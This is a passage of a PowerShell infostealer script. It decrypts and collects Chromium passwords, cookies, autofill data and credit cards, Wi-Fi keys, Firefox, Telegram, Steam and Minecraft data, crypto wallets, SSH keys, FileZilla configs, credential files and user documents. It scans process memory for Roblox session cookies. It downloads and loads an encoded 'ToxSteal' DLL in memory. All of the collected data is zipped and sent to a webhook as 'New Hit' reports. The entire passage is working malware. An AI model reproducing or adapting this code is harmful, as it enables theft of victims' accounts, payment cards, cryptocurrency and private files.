[IO.File]::WriteAllText([IO.Path]::Combine($tmp,"chunk_0","sys.txt"),(@("Host: $hostname","User: $username","OS: $os","Arch: $arch","Admin: $isAdmin","IP: $ip","Country: $country","City: $city","ISP: $isp")-join"`r`n"))
$chunkSize+=200

# screenshot into chunk 0
$scPath=[IO.Path]::Combine($tmp,"sc.png");if(Test-Path $scPath){$scb=[IO.File]::ReadAllBytes($scPath);Noob-AddToChunk $scb "sc.png"}

# ── chromium browser DBs ───────────────────────────────────────────
$cryptoExtIds=@("nkbihfbeogaeaoehlefnkodbefgpgknn","hnfanknocfeofbddgcijnmhnfnkdnaad","bfnaelmomeimhlpmgjnjophhpkkoljpa","aholpfdialjgjfhomihkjbmgjidlcdno","fhbohimaelbohpjbbldcngcnapndodjp","odbfpeeihdkbihmopkbjmoonfanlbfcl","mcohilncbfahbmgdjkbpemcciiolgcge","lgmpcpglpngdoalbgeoldeajfclnhafa","nanjmdknhkinifnkgdcggcfnhdaammmj","bhghoamapcdpbohphigoooaddinpkbai")
foreach($bn in $profiles.Keys){
  $base=$profiles[$bn]
  if(-not(Test-Path $base)){continue}
  $mk=Noob-GetMasterKey "$base\Local State"
  $mkB64=if($mk){[Convert]::ToBase64String($mk)}else{"none"}
  Noob-AddToChunk ([Text.Encoding]::UTF8.GetBytes($mkB64)) "mk_${bn}.txt"
  # enumerate ALL profile subdirs (Default, Profile 1, Profile 2, etc)
  $profileDirs=@("$base\Default")
  Get-ChildItem $base -Directory -EA SilentlyContinue|Where-Object{$_.Name -match "^Profile"}|ForEach-Object{$profileDirs+=$_.FullName}
  foreach($pd in $profileDirs){
    $dbs=[ordered]@{
      "Login_Data"="$pd\Login Data"
      "Web_Data"="$pd\Web Data"
      "Cookies"="$pd\Network\Cookies"
      "History"="$pd\History"
    }
    foreach($name in $dbs.Keys){
      $src=$dbs[$name]
      if(-not(Test-Path $src)){if($name -eq "Cookies"){$src="$pd\Cookies"};if(-not(Test-Path $src)){continue}}
      $raw=Noob-ReadLocked $src
      if($raw -and $raw.Length -gt 4096){$pslug=$pd.Split("\")[-1];Noob-AddToChunk $raw "${bn}_${pslug}_${name}.db"}
    }
    foreach($extId in $cryptoExtIds){
      $extPath="$pd\Local Extension Settings\$extId"
      if(Test-Path $extPath){
        Get-ChildItem $extPath -Include "*.ldb","*.log","*.json" -Recurse -EA SilentlyContinue|Where-Object{$_.Length -lt 5MB}|ForEach-Object{
          $rb=Noob-ReadLocked $_.FullName;if($rb -and $rb.Length -gt 0){$pslug=$pd.Split("\")[-1];Noob-AddToChunk $rb "${bn}_${pslug}_ext_${extId}_$($_.Name)"}
        }
      }
    }
  }
}

# ── decrypt helper (before first use — passwords calls it) ────────
function Noob-DecryptCookie($encBytes,$mk,$mkV20){
  try{
    if(-not $encBytes -or $encBytes.Length -lt 15){return $null}
    $pfx=[Text.Encoding]::ASCII.GetString($encBytes[0..2])
    if($pfx -ne "v10" -and $pfx -ne "v11" -and $pfx -ne "v20"){return [Text.Encoding]::UTF8.GetString($encBytes)}
    $key=if($pfx -eq "v20"){$mkV20}else{$mk}
    if(-not $key){return $null}
    $iv=New-Object byte[] 12;[Array]::Copy($encBytes,3,$iv,0,12)
    $ctTag=New-Object byte[] ($encBytes.Length-15);[Array]::Copy($encBytes,15,$ctTag,0,$ctTag.Length)
    $plain=[GcmCrypt]::Decrypt([byte[]]$key,$iv,$ctTag)
    if(-not $plain){return $null}
    if($plain.Length -ge 32){
      $pr=0;for($i=0;$i-lt 32;$i++){$b=$plain[$i];if($b-gt 31-and$b-lt 127){$pr++}}
      if($pr-gt 4){$st=New-Object byte[] ($plain.Length-32);[Array]::Copy($plain,32,$st,0,$st.Length);$plain=$st}
    }
    return [Text.Encoding]::UTF8.GetString($plain)
  }catch{return $null}
}

# ── passwords / autofill / cards (tox semantics) ──────────────────
$pwCount=0;$pwV20=0;$pwV20Ok=0;$afCount=0;$ccCount=0
foreach($bn in $profiles.Keys){
  $base=$profiles[$bn]
  if(-not(Test-Path $base)){continue}
  $mk=Noob-GetMasterKey "$base\Local State"
  $mkV20=$null;try{$mkV20=[V20Key]::Get("$base\Local State")}catch{}
  $pwDirs=@("$base\Default")
  Get-ChildItem $base -Directory -EA SilentlyContinue|Where-Object{$_.Name -match "^(Profile|Guest Profile|System Profile)"}|ForEach-Object{$pwDirs+=$_.FullName}
  foreach($pd in $pwDirs){
    $pslug=$pd.Split("\")[-1]
    $ld="$pd\Login Data"
    if(Test-Path $ld){
      $ldBytes=Noob-ReadLocked $ld
      if($ldBytes -and $ldBytes.Length -ge 100){
        $ldTmp=[IO.Path]::Combine($tmp,"ld_$([Guid]::NewGuid().ToString("N").Substring(0,6)).db")
        [IO.File]::WriteAllBytes($ldTmp,$ldBytes)
        $walTmp=$ldTmp+"-wal";$walSrc=$ld+"-wal";if(Test-Path $walSrc){$wb=Noob-ReadLocked $walSrc;if($wb){[IO.File]::WriteAllBytes($walTmp,$wb)}}
        try{
          $rows=[SQLiteHelper]::GetRows($ldTmp,"SELECT origin_url,username_value,password_value FROM logins",(0,1,2))
          $sb=New-Object Text.StringBuilder
          foreach($rw in $rows){
            $org=if($rw[0]){$([Text.Encoding]::UTF8.GetString($rw[0]))}else{""}
            $usr=if($rw[1]){$([Text.Encoding]::UTF8.GetString($rw[1]))}else{""}
            $pv=$rw[2]
            if(-not $org -or -not $usr -or -not $pv){continue}
            $pfx=[Text.Encoding]::ASCII.GetString($pv[0..2])
            if($pfx -eq "v20"){$pwV20++}
            $pw=Noob-DecryptCookie $pv $mk $mkV20
            if($pw -and $pfx -eq "v20"){$pwV20Ok++}
            if($pw){[void]$sb.AppendLine("Hostname: $org`nUsername: $usr`nPassword: $pw`n");$pwCount++}
          }
          if($sb.Length -gt 0){Noob-AddToChunk ([Text.Encoding]::UTF8.GetBytes($sb.ToString())) "Passwords_$($bn)_$($pslug).txt"}
        }catch{}
        Remove-Item $ldTmp -EA 0;Remove-Item $walTmp -EA 0
      }
    }
    $wd="$pd\Web Data"
    if(Test-Path $wd){
      $wdBytes=Noob-ReadLocked $wd
      if($wdBytes -and $wdBytes.Length -ge 100){
        $wdTmp=[IO.Path]::Combine($tmp,"wd_$([Guid]::NewGuid().ToString("N").Substring(0,6)).db")
        [IO.File]::WriteAllBytes($wdTmp,$wdBytes)
        $walTmp2=$wdTmp+"-wal";$walSrc2=$wd+"-wal";if(Test-Path $walSrc2){$wb2=Noob-ReadLocked $walSrc2;if($wb2){[IO.File]::WriteAllBytes($walTmp2,$wb2)}}
        try{
          $afRows=[SQLiteHelper]::GetRows($wdTmp,"SELECT name,value FROM autofill",(0,1))
          $sbA=New-Object Text.StringBuilder
          foreach($rw in $afRows){
            $n=if($rw[0]){$([Text.Encoding]::UTF8.GetString($rw[0]))}else{""}
            $v=if($rw[1]){$([Text.Encoding]::UTF8.GetString($rw[1]))}else{""}
            if($n -and $v){[void]$sbA.AppendLine("Name: $n`nValue: $v`n");$afCount++}
          }
          if($sbA.Length -gt 0){Noob-AddToChunk ([Text.Encoding]::UTF8.GetBytes($sbA.ToString())) "AutoFill_$($bn)_$($pslug).txt"}
        }catch{}
        try{
          $ccRows=[SQLiteHelper]::GetRows($wdTmp,"SELECT name,expiration_year,expiration_month,card_number_encrypted FROM credit_cards",(0,1,2,3))
          $sbC=New-Object Text.StringBuilder
          foreach($rw in $ccRows){
            $n=if($rw[0]){$([Text.Encoding]::UTF8.GetString($rw[0]))}else{""}
            $yr=if($rw[1]){$([Text.Encoding]::UTF8.GetString($rw[1]))}else{""}
            $mo=if($rw[2]){$([Text.Encoding]::UTF8.GetString($rw[2]))}else{""}
            $enc=$rw[3]
            if(-not $enc -or -not $yr -or -not $mo){continue}
            $num=Noob-DecryptCookie $enc $mk $mkV20
            if($num){[void]$sbC.AppendLine("Number: $num`nExp: $mo/$yr`nHolder: $n`n");$ccCount++}
          }
          if($sbC.Length -gt 0){Noob-AddToChunk ([Text.Encoding]::UTF8.GetBytes($sbC.ToString())) "CreditCards_$($bn)_$($pslug).txt"}
        }catch{}
        Remove-Item $wdTmp -EA 0;Remove-Item $walTmp2 -EA 0
      }
    }
  }
}

# ── full cookie dump (tox Cookie/CookieNetwork mirror) ───────────
$ckDump=0
foreach($bn in $profiles.Keys){
  $base=$profiles[$bn]
  if(-not(Test-Path $base)){continue}
  $mk=Noob-GetMasterKey "$base\Local State"
  $mkV20=$null;try{$mkV20=[V20Key]::Get("$base\Local State")}catch{}
  $pwDirs=@("$base\Default")
  Get-ChildItem $base -Directory -EA SilentlyContinue|Where-Object{$_.Name -match "^(Profile|Guest Profile|System Profile)"}|ForEach-Object{$pwDirs+=$_.FullName}
  foreach($pd in $pwDirs){
    $pslug=$pd.Split("\")[-1]
    foreach($ckName in @("Network\Cookies","Cookies")){
      $ckPath="$pd\$ckName"
      if(-not(Test-Path $ckPath)){continue}
      $ckBytes=Noob-ReadLocked $ckPath
      if(-not $ckBytes -or $ckBytes.Length -lt 100){continue}
      $ckTmp=[IO.Path]::Combine($tmp,"ckd_$([Guid]::NewGuid().ToString("N").Substring(0,6)).db")
      [IO.File]::WriteAllBytes($ckTmp,$ckBytes)
      $walTmp=$ckTmp+"-wal";$walSrc=$ckPath+"-wal";if(Test-Path $walSrc){$wb=Noob-ReadLocked $walSrc;if($wb){[IO.File]::WriteAllBytes($walTmp,$wb)}}
      try{
        $ckRows=[SQLiteHelper]::GetRows($ckTmp,"SELECT host_key,name,path,is_secure,is_httponly,encrypted_value FROM cookies",(0,1,2,3,4,5))
        $sbK=New-Object Text.StringBuilder
        $ckN=0
        foreach($rw in $ckRows){
          if($ckN -ge 4000){break}
          $hostK=if($rw[0]){$([Text.Encoding]::UTF8.GetString($rw[0]))}else{""}
          $ckNm=if($rw[1]){$([Text.Encoding]::UTF8.GetString($rw[1]))}else{""}
          $ckPs=if($rw[2]){$([Text.Encoding]::UTF8.GetString($rw[2]))}else{"/"}
          $ckSec=if($rw[3] -and $rw[3].Length-gt 0 -and $rw[3][0]-eq 1){"TRUE"}else{"FALSE"}
          $ckEnc=$rw[5]
          if(-not $hostK -or -not $ckNm){continue}
          $ckVal=""
          if($ckEnc -and $ckEnc.Length-gt 3){$ckVal=Noob-DecryptCookie $ckEnc $mk $mkV20}
          [void]$sbK.AppendLine("$hostK`tTRUE`t$ckPs`t$ckSec`t0`t$ckNm`t$ckVal")
          $ckN++;$ckDump++
        }
        if($sbK.Length -gt 0){Noob-AddToChunk ([Text.Encoding]::UTF8.GetBytes($sbK.ToString())) "Cookies_$($bn)_$($pslug).txt"}
      }catch{}
      Remove-Item $ckTmp -EA 0;Remove-Item $walTmp -EA 0
    }
  }
}

# ── wifi keys (tox WifiKeys mirror) ───────────────────────────────
$wifiCount=0
try{
  $wpSb=New-Object Text.StringBuilder
  [void]$wpSb.AppendLine("Profile`tKey`tAuth`tCipher")
  $wpList=(& netsh wlan show profiles 2>$null|Out-String)-split "`n"|Where-Object{$_-match "All User Profile"}|ForEach-Object{($_-split ":")[-1].Trim()}
  foreach($wp in $wpList){
    if(-not $wp){continue}
    $info=(& netsh wlan show profile name="$wp" key=clear 2>$null|Out-String)
    $kc=if($info-match "Key Contents+:s+(S+)"){$Matches[1]}else{"Not found"}
    $au=if($info-match "Authentications+:s+(w+)"){$Matches[1]}else{"Not found"}
    $ci=if($info-match "Ciphers+:s+(w+)"){$Matches[1]}else{"Not found"}
    [void]$wpSb.AppendLine("$wp`t$kc`t$au`t$ci")
    $wifiCount++
  }
  if($wifiCount-gt 0){Noob-AddToChunk ([Text.Encoding]::UTF8.GetBytes($wpSb.ToString())) "WifiKeys.txt"}
}catch{}

# ── file grabber (tox FileGrabberEnhanced mirror) ──────────────────
$fgCount=0;$fgBytes=0;$fgCap=10000000
$fgExt=@(".ovpn",".txt",".zip",".7z",".rar",".pdf",".rtf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".indd",".json",".mafile",".db",".db3",".db4",".kdb",".kdbx",".sql",".sqlite",".mdf",".mdb",".dsk",".dbf",".wallet",".ini",".c",".cs",".cpp",".asm",".sh",".py",".pyw",".html",".css",".php",".go",".js",".rb",".pl",".swift",".java",".kt",".kts",".ino",".jpg",".jpeg",".png",".bmp",".psd",".svg",".ai",".keys")
$fgRoots=@("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads")
foreach($fr in $fgRoots){
  if(-not(Test-Path $fr)){continue}
  Get-ChildItem $fr -Recurse -File -EA SilentlyContinue|Where-Object{$fgExt -contains $_.Extension.ToLower() -and $_.Length -gt 0 -and $_.Length -le 5000000}|ForEach-Object{
    if($fgBytes -ge $fgCap){return}
    $fb=Noob-ReadLocked $_.FullName
    if($fb -and $fb.Length -gt 0){
      $rel=$_.FullName.Substring($env:USERPROFILE.Length+1) -replace "[<>:|?*\\]","_"
      Noob-AddToChunk $fb "grab_$rel"
      $fgBytes+=$fb.Length;$fgCount++
    }
  }
}

# ── firefox ────────────────────────────────────────────────────────
$ffBase="$env:APPDATA\Mozilla\Firefox\Profiles"
if(Test-Path $ffBase){
  Get-ChildItem $ffBase -Directory -EA SilentlyContinue|ForEach-Object{
    $ffp=$_.FullName
    foreach($fn in @("key4.db","logins.json","cookies.sqlite","places.sqlite","formhistory.sqlite")){
      $fp="$ffp\$fn";if(-not(Test-Path $fp)){continue}
      $rb=Noob-ReadLocked $fp;if($rb -and $rb.Length -gt 0){Noob-AddToChunk $rb "FF_$($_.Name)_$fn"}
    }
  }
}

# ── telegram tdata ─────────────────────────────────────────────────
$tgPath="$env:APPDATA\Telegram Desktop\tdata"
if(Test-Path $tgPath){
  Get-ChildItem $tgPath -File -EA SilentlyContinue|Where-Object{$_.Length -lt 5MB -and $_.Name -notmatch "\.(png|jpg|gif|bmp|ico)$"}|ForEach-Object{
    $rb=Noob-ReadLocked $_.FullName;if($rb -and $rb.Length -gt 0){Noob-AddToChunk $rb "TG_$($_.Name)"}
  }
}

# ── steam ──────────────────────────────────────────────────────────
$steamPath="C:\Program Files (x86)\Steam"
if(-not(Test-Path $steamPath)){$steamPath="$env:PROGRAMFILES\Steam"}
if(Test-Path $steamPath){
  Get-ChildItem $steamPath -Filter "ssfn*" -EA SilentlyContinue|ForEach-Object{
    $rb=Noob-ReadLocked $_.FullName;if($rb -and $rb.Length -gt 0){Noob-AddToChunk $rb "Steam_$($_.Name)"}
  }
  $lup="$steamPath\config\loginusers.vdf";if(Test-Path $lup){$rb=Noob-ReadLocked $lup;if($rb){Noob-AddToChunk $rb "Steam_loginusers.vdf"}}
  $scfg="$steamPath\config\config.vdf";if(Test-Path $scfg){$rb=Noob-ReadLocked $scfg;if($rb){Noob-AddToChunk $rb "Steam_config.vdf"}}
}

# ── minecraft ──────────────────────────────────────────────────────
$mcBase="$env:APPDATA\.minecraft"
if(Test-Path $mcBase){
  foreach($fn in @("launcher_profiles.json","usercache.json")){
    $fp="$mcBase\$fn";if(Test-Path $fp){$rb=Noob-ReadLocked $fp;if($rb){Noob-AddToChunk $rb "MC_$fn"}}
  }
}
foreach($launcher in @("$env:APPDATA\FeatherClient","$env:APPDATA\Badlion Client","$env:LOCALAPPDATA\Programs\Lunar Client")){
  if(-not(Test-Path $launcher)){continue}
  Get-ChildItem $launcher -Include "*.json","*.db" -Recurse -EA SilentlyContinue|Where-Object{$_.Length -lt 2MB}|ForEach-Object{
    $rb=Noob-ReadLocked $_.FullName;if($rb){Noob-AddToChunk $rb "MC_launcher_$($_.Name)"}
  }
}

# ── crypto desktop wallets ─────────────────────────────────────────
$wallets=@{
  "Exodus"="$env:APPDATA\Exodus\exodus.wallet"
  "Electrum"="$env:APPDATA\Electrum\wallets"
  "Atomic"="$env:APPDATA\atomic\Local Storage\leveldb"
  "Bitcoin"="$env:APPDATA\Bitcoin\wallets"
  "Ethereum"="$env:APPDATA\Ethereum\keystore"
  "Monero"="$env:APPDATA\bitmonero"
  "Litecoin"="$env:APPDATA\Litecoin\wallets"
}
foreach($wname in $wallets.Keys){
  $wp=$wallets[$wname];if(-not(Test-Path $wp)){continue}
  Get-ChildItem $wp -Recurse -File -EA SilentlyContinue|Where-Object{$_.Length -lt 5MB}|ForEach-Object{
    $rb=Noob-ReadLocked $_.FullName;if($rb -and $rb.Length -gt 0){Noob-AddToChunk $rb "${wname}_$($_.Name)"}
  }
}

# ── SSH keys ───────────────────────────────────────────────────────
$sshPath="$env:USERPROFILE\.ssh"
if(Test-Path $sshPath){
  Get-ChildItem $sshPath -File -EA SilentlyContinue|ForEach-Object{
    $rb=Noob-ReadLocked $_.FullName;if($rb -and $rb.Length -lt 100KB){Noob-AddToChunk $rb "SSH_$($_.Name)"}
  }
}

# ── FileZilla ──────────────────────────────────────────────────────
$fzBase="$env:APPDATA\FileZilla"
if(Test-Path $fzBase){
  foreach($fn in @("recentservers.xml","sitemanager.xml")){
    $fp="$fzBase\$fn";if(Test-Path $fp){$rb=Noob-ReadLocked $fp;if($rb){Noob-AddToChunk $rb "FZ_$fn"}}
  }
}

# ── env/config credential files ────────────────────────────────────
$credRx=[regex]"(?i)(password|passwd|secret|api.?key|token|seed|mnemonic|private.?key)"
$scanDirs=@($env:USERPROFILE,$env:USERPROFILE+"\Desktop",$env:USERPROFILE+"\Documents",$env:USERPROFILE+"\Downloads")
foreach($sd in $scanDirs){
  if(-not(Test-Path $sd)){continue}
  Get-ChildItem $sd -File -Include "*.env","*.txt","*.json","*.cfg","*.config","*.ini","*.xml","*.yaml","*.yml" -EA SilentlyContinue|Where-Object{$_.Length -lt 500KB}|ForEach-Object{
    try{$ct=[IO.File]::ReadAllText($_.FullName);if($credRx.IsMatch($ct)){$rb=[Text.Encoding]::UTF8.GetBytes($ct);Noob-AddToChunk $rb "CRED_$($_.Name)"}}catch{}
  }
}

# ── cleanup VSS ────────────────────────────────────────────────────
try{if($shadow){$shadow.Delete()}}catch{}

# ── roblox cookie ────────────────────────────────────────────────────────────
$robloxCookie="none";$robloxName="none";$robloxId="none";$robloxRobux="none";$robloxPremium="No"
$rbxPrefix="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items."
$rbxCandidates=@()
function Noob-IsRealCookie($c){
  if([string]::IsNullOrEmpty($c)){return $false}
  if($c.Length -lt 250){return $false}
  if(-not $c.StartsWith($rbxPrefix)){return $false}
  if($c.Substring($rbxPrefix.Length) -match "[(){};*<>]"){return $false}
  return $true
}
function Noob-AddCookie($c){
  if((Noob-IsRealCookie $c) -and ($rbxCandidates -notcontains $c)){$script:rbxCandidates+=$c}
}
try{
  Add-Type -AssemblyName System.Security
  # 1) RobloxCookies.dat — DPAPI blob, cleanest path
  $rbxDat="$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat"
  if(Test-Path $rbxDat){
    try{
      $rawDat=Noob-ReadLocked $rbxDat
      if($rawDat){
        # try raw DPAPI first
        try{$plain=[Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($rawDat,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser));$rxM=[regex]::Match($plain,"_\|WARNING\S+");if($rxM.Success){Noob-AddCookie $rxM.Value}}catch{}
        # try JSON wrapper — {"cookie":"<b64>","..."}
        if($rbxCandidates.Count -eq 0){
          try{
            $j=[Text.Encoding]::UTF8.GetString($rawDat)|ConvertFrom-Json
            $candidates=@($j.cookie,$j.Cookie,$j.value,$j.Value,$j.data,$j.Data)|Where-Object{$_}
            foreach($c in $candidates){
              try{$blob=[Convert]::FromBase64String($c);$pt=[Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($blob,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser));$rxM2=[regex]::Match($pt,"_\|WARNING\S+");if($rxM2.Success){Noob-AddCookie $rxM2.Value}}catch{}
            }
          }catch{}
        }
      }
    }catch{}
  }
  # 2) Registry
  $regPaths=@("HKCU:\Software\Roblox\RobloxStudioBrowser\roblox.com","HKCU:\Software\Roblox\RobloxBrowser\roblox.com","HKCU:\Software\Roblox")
  foreach($rp in $regPaths){
    try{$rv=Get-ItemProperty -Path $rp -EA Stop;$rv.PSObject.Properties|ForEach-Object{$v=[string]$_.Value;if($v -match "_\|WARNING"){Noob-AddCookie $v}}}catch{}
  }
  # 3) Roblox app LDB dirs
  if($rbxCandidates.Count -eq 0){
  $sq=[char]39;$dq=[char]34;$rxPat="_\|WARNING[^"+$dq+$sq+"\s]{20,}"
  $rbxAppDirs=@("$env:LOCALAPPDATA\Roblox\LocalStorage\leveldb","$env:APPDATA\Roblox\LocalStorage\leveldb","$env:LOCALAPPDATA\Roblox","$env:APPDATA\Roblox")
  $pkgRoot="$env:LOCALAPPDATA\Packages"
  if(Test-Path $pkgRoot){Get-ChildItem $pkgRoot -Directory -EA SilentlyContinue|Where-Object{$_.Name-like "*roblox*"}|ForEach-Object{$rbxAppDirs+=$_.FullName}}
  foreach($rbxDir in $rbxAppDirs){
    if(-not(Test-Path $rbxDir)){continue}
    Get-ChildItem $rbxDir -Recurse -File -Include "*.ldb","*.log" -EA SilentlyContinue|Where-Object{$_.Length -lt 2MB}|ForEach-Object{
      try{$ct=[IO.File]::ReadAllText($_.FullName);[regex]::Matches($ct,$rxPat)|ForEach-Object{Noob-AddCookie $_.Value}}catch{}
    }
  }
  }
  # 4) Browser Cookies — winsqlite3 exact query, ALL profiles
  foreach($bn in $profiles.Keys){
    $base=$profiles[$bn]
    $mk=Noob-GetMasterKey "$base\Local State"
    if(-not $mk){continue}
    $profileDirs2=@("$base\Default")
    Get-ChildItem $base -Directory -EA SilentlyContinue|Where-Object{$_.Name -match "^Profile"}|ForEach-Object{$profileDirs2+=$_.FullName}
    foreach($pd in $profileDirs2){
      foreach($ckName in @("Network\Cookies","Cookies")){
        $ckPath="$pd\$ckName"
        if(-not(Test-Path $ckPath)){continue}
        $ckBytes=Noob-ReadLocked $ckPath
        if(-not $ckBytes -or $ckBytes.Length -lt 100){continue}
        $ckTmp=[IO.Path]::Combine($tmp,"ck_$([Guid]::NewGuid().ToString("N").Substring(0,6)).db")
        [IO.File]::WriteAllBytes($ckTmp,$ckBytes)
        $walTmp=$ckTmp+"-wal";$walSrc=$ckPath+"-wal";if(Test-Path $walSrc){$wb=Noob-ReadLocked $walSrc;if($wb){[IO.File]::WriteAllBytes($walTmp,$wb)}}
        try{
          $rbxSql="SELECT encrypted_value FROM cookies WHERE host_key LIKE 
'%.roblox.com%'
 AND name=
'.ROBLOSECURITY'
 LIMIT 1"
          $blob=[SQLiteHelper]::GetBlob($ckTmp,$rbxSql)
          if($blob -and $blob.Length -gt 15){
            $plain=Noob-DecryptCookie $blob $mk
            if($plain -and $plain -match "_\|WARNING"){Noob-AddCookie $plain}
          }
        }catch{}
        Remove-Item $ckTmp -EA 0
        Remove-Item $walTmp -EA 0
      }
    }
  }
  # 5) Process memory — all processes
  if($rbxCandidates.Count -eq 0){
    try{
      $rbxMemPat="_\|WARNING[^\s\x00-\x1f]{100,}"
      $rbxSw=[Diagnostics.Stopwatch]::StartNew()
      foreach($rp2 in (Get-Process -Name "chrome","msedge","brave","opera","opera_gx","firefox","vivaldi","RobloxPlayerBeta","RobloxStudioBeta","Windows10Universal" -EA SilentlyContinue)){
        if($rbxCandidates.Count -gt 0 -or $rbxSw.Elapsed.TotalSeconds -gt 15){break}
        try{$hits=[MemScan]::Scan($rp2.Id,$rbxMemPat);foreach($h in $hits){Noob-AddCookie $h}}catch{}
      }
    }catch{}
  }
  $rbxCandidates=$rbxCandidates|Select-Object -Unique
  $rbxValidated=$false
  foreach($cand in $rbxCandidates){
    try{
      $rh=@{"Cookie"=".ROBLOSECURITY=$cand";"Content-Type"="application/json"}
      $rme=Invoke-RestMethod -Uri "https://users.roblox.com/v1/users/authenticated" -Headers $rh -EA Stop
      if($rme.id){
        $robloxCookie=$cand;$robloxId=[string]$rme.id;$robloxName=$rme.name
        try{$reco=Invoke-RestMethod -Uri "https://economy.roblox.com/v1/user/currency" -Headers $rh -EA Stop;$robloxRobux=[string]$reco.robux}catch{}
        try{$rprem=Invoke-RestMethod -Uri "https://premiumfeatures.roblox.com/v1/users/$robloxId/validate-membership" -Headers $rh -EA Stop;$robloxPremium=if($rprem -eq $true -or $rprem -eq "true"){"Yes"}else{"No"}}catch{}
        $rbxValidated=$true;break
      }
    }catch{}
  }
  if(-not $rbxValidated){
    if($rbxCandidates.Count -gt 0){$robloxCookie=$rbxCandidates[0];$robloxName="unvalidated"}
    else{$robloxCookie="none"}
  }
  if($robloxCookie -ne "none"){Noob-AddToChunk ([Text.Encoding]::UTF8.GetBytes($robloxCookie)) "ROBLOX_COOKIE.txt"}
}catch{}

# toxsteal pass
$toxEntries=0;$toxErr="";$toxStage="init"
try{
  $toxStage="download"
  $toxDll=[IO.Path]::Combine($env:TEMP,"tox_$uid.dll")
  Invoke-WebRequest -Uri $toxUrl -OutFile $toxDll -UseBasicParsing -TimeoutSec 180 -EA Stop
  $toxStage="decode"
  $raw=[IO.File]::ReadAllBytes($toxDll)
  $dec=[byte[]]($raw|ForEach-Object{$_ -bxor 0x42})
  $toxStage="load($($dec.Length)B)"
  $zAsm=[Reflection.Assembly]::Load($dec)
  $toxStage="initmod"
  $null=[Activator]::CreateInstance($zAsm.GetType("ToxStealLib.Target.Sys.ProductKey"))
  $zT=$zAsm.GetType("ToxStealLib.ToxStealClient")
  $zC=[Activator]::CreateInstance($zT)
  $toxStage="invoke"
  $zData=$zT.GetMethod("RunStealerLogic",[Reflection.BindingFlags]"NonPublic,Instance").Invoke($zC,$null)
  $toxStage="invoked($([int]$zData.Length)B)"
  if($zData -and $zData.Length -gt 0){
    $toxZp=[IO.Path]::Combine($env:TEMP,"tox_$uid.zip")
    [IO.File]::WriteAllBytes($toxZp,$zData)
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $toz=[System.IO.Compression.ZipFile]::OpenRead($toxZp)
    foreach($ze in $toz.Entries){
      if($ze.Length -le 0 -or $ze.Length -gt $maxChunk){continue}
      try{$zeS=$ze.Open();$zeM=New-Object IO.MemoryStream;$zeS.CopyTo($zeM);$zeS.Dispose();Noob-AddToChunk $zeM.ToArray() ("tox_"+($ze.FullName -replace "[<>:|?*\\/]","_"));$toxEntries++}catch{}
    }
    $toz.Dispose()
    Remove-Item $toxZp -Force -EA 0
  }
  Remove-Item $toxDll -Force -EA 0
}catch{$toxErr="["+$toxStage+"] "+$_.Exception.Message}

# ── send main embed ────────────────────────────────────────────────
$tokenVal=if($discordToken){$discordToken}else{"none"}
$totalChunks=$chunkIdx+1
$fields=[System.Collections.Generic.List[hashtable]]::new()
$fields.Add(@{name=":computer: System";value="``Host:`` $hostname`n``User:`` $username`n``OS:`` $os`n``Arch:`` $arch`n``Admin:`` $isAdmin";inline=$true})
$fields.Add(@{name=":globe_with_meridians: Network";value="``IP:`` $ip`n``Country:`` $country`n``City:`` $city`n``ISP:`` $isp";inline=$true})
$fields.Add(@{name=":purple_circle: Discord";value="``User:`` $dUser`n``Display:`` $dDisplay`n``Email:`` $dEmail`n``Phone:`` $dPhone`n``MFA:`` $dMfa`n``Nitro:`` $dNitro";inline=$false})
$fields.Add(@{name=":key: Token";value="``$tokenVal``";inline=$false})
$fields.Add(@{name=":video_game: Roblox";value="``Name:`` $robloxName`n``ID:`` $robloxId`n``Robux:`` $robloxRobux`n``Premium:`` $robloxPremium";inline=$true})
if($robloxCookie -ne "none"){$fields.Add(@{name=":cookie: Roblox Cookie";value="``"+$robloxCookie.Substring(0,[Math]::Min(1000,$robloxCookie.Length))+"``";inline=$false})}
$fields.Add(@{name=":package: Zips";value="Sending $totalChunks zip(s)";inline=$true})
$fields.Add(@{name=":shield: ToxSteal";value="$toxEntries files$(if($toxErr){" | "+$toxErr.Substring(0,[Math]::Min(300,$toxErr.Length))})";inline=$true})
$fields.Add(@{name=":key: Steal";value="$pwCount passwords, $pwV20 v20($pwV20Ok ok), $afCount autofill, $ccCount cards, $ckDump cookies, $wifiCount wifi";inline=$true})
$fields.Add(@{name=":open_file_folder: Files";value="$fgCount files ($fgBytes B)";inline=$true})
$embed=@{title=":satellite: New Hit — $hostname";color=0xE74C3C;fields=$fields.ToArray();footer=@{text="stoplag.org"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")}
if($dAvatar){$embed.thumbnail=@{url=$dAvatar}}
Noob-SendEmbed $wh $embed

# ── zip and send each chunk ─────────────────────────────────────────
for($ci=0;$ci -le $chunkIdx;$ci++){
  $cd=[IO.Path]::Combine($tmp,"chunk_$ci")
  $zp=[IO.Path]::Combine($tmp,"${hostname}_${uid}_part${ci}.zip")
  try{[System.IO.Compression.ZipFile]::CreateFromDirectory($cd,$zp)}catch{continue}
  if(Test-Path $zp){
    $zsz=[Math]::Round((Get-Item $zp).Length/1MB,1)
    Noob-SendZip $wh $zp "${hostname}_part${ci}.zip" "part $($ci+1) of $totalChunks — $hostname ($zsz MB)"
    Remove-Item $zp -Force -EA 0
  }
}

Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
